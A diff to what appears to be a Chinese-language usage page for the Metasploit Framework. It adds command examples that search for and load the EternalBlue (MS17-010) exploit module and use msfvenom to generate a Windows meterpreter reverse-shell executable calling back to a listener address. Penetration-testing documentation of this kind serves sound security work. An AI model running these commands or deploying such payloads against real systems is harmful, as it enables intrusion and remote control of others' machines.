@@ -11,8 +11,17 @@
 
 ## 命令示例
 ```bash
-# 基本用法
-metasploit-framework [参数]
+# 启动 msfconsole
+msfconsole
+
+# 搜索漏洞利用
+msfconsole -q -x "search eternalblue"
+
+# 使用特定模块
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; show options"
+
+# 生成 payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
 ```
 
 ## 使用场景
